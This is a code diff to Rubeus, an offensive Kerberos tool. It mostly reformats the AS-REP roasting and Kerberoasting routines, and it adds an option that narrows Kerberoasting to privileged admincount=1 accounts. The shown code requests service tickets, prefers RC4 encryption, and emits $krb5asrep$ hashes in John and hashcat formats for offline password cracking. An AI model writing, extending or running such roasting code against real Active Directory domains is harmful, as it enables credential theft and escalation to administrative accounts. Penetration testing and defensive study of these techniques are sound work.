@@ -39,7 +39,8 @@ namespace Rubeus
                 // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
                 GetASRepHash(userName, domain, domainController, format, outFile);
             }
-            else {
+            else
+            {
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
                 string bindPath = "";
@@ -182,7 +183,7 @@ namespace Rubeus
         public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
         {
             // roast AS-REPs for users without pre-authentication enabled
-            
+
             string dcIP = Networking.GetDCIP(domainController);
             if (String.IsNullOrEmpty(dcIP)) { return; }
 
@@ -214,17 +215,17 @@ namespace Rubeus
                 repHash = repHash.Insert(32, "$");
 
                 string hashString = "";
-                if(format == "john")
+                if (format == "john")
                 {
                     hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                 }
-                else if(format == "hashcat")
+                else if (format == "hashcat")
                 {
                     hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                 }
                 else
                 {
-                  Console.WriteLine("Please provide a cracking format.");
+                    Console.WriteLine("Please provide a cracking format.");
                 }
 
                 if (!String.IsNullOrEmpty(outFile))
@@ -247,7 +248,7 @@ namespace Rubeus
                     // display the base64 of a hash, columns of 80 chararacters
                     foreach (string line in Helpers.Split(hashString, 80))
                     {
-                        Console.WriteLine("      {0}", line);    
+                        Console.WriteLine("      {0}", line);
                     }
                     Console.WriteLine();
                 }
@@ -264,7 +265,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4")
+        public static void Kerberoast(string spn = "", bool adminCount = false, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4")
         {
             Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");
 
@@ -301,7 +302,8 @@ namespace Rubeus
                     GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
                 }
             }
-            else {
+            else
+            {
                 if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
                 {
                     if (!String.IsNullOrEmpty(userName))
@@ -463,7 +465,14 @@ namespace Rubeus
 
                     // samAccountType=805306368                                 ->  user account
                     // serviceprincipalname=*                                   ->  non-null SPN
-                    string userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
+                    // admincount=1                                             -> admin count set 
+                    string adminCountFilter = "";
+                    if (adminCount == true)
+                    {
+                        Console.WriteLine("[+] Searching for admincount users...");
+                        adminCountFilter = "(admincount=1)";
+                    }
+                    string userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, adminCountFilter);
                     userSearcher.Filter = userSearchFilter;
                 }
                 catch (Exception ex)
@@ -509,7 +518,7 @@ namespace Rubeus
                             // if a TGT .kirbi is supplied, use that for the request
                             //      this could be a passed TGT or if TGT delegation is specified
 
-                            if (    String.Equals(supportedEType, "rc4") &&
+                            if (String.Equals(supportedEType, "rc4") &&
                                     (
                                         ((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
                                         ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)
@@ -574,14 +583,14 @@ namespace Rubeus
                 }
                 byte[] requestBytes = ticket.GetRequest();
 
-                if ( !((requestBytes[15] == 1) && (requestBytes[16] == 0)) )
+                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                 {
                     Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                     return;
                 }
 
                 // ignore the GSSAPI frame
-                byte[] apReqBytes = new byte[requestBytes.Length-17];
+                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                 Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
 
                 AsnElt apRep = AsnElt.Decode(apReqBytes);
@@ -599,7 +608,7 @@ namespace Rubeus
                     {
                         foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                         {
-                            if(elem2.TagValue == 3)
+                            if (elem2.TagValue == 3)
                             {
                                 foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                 {
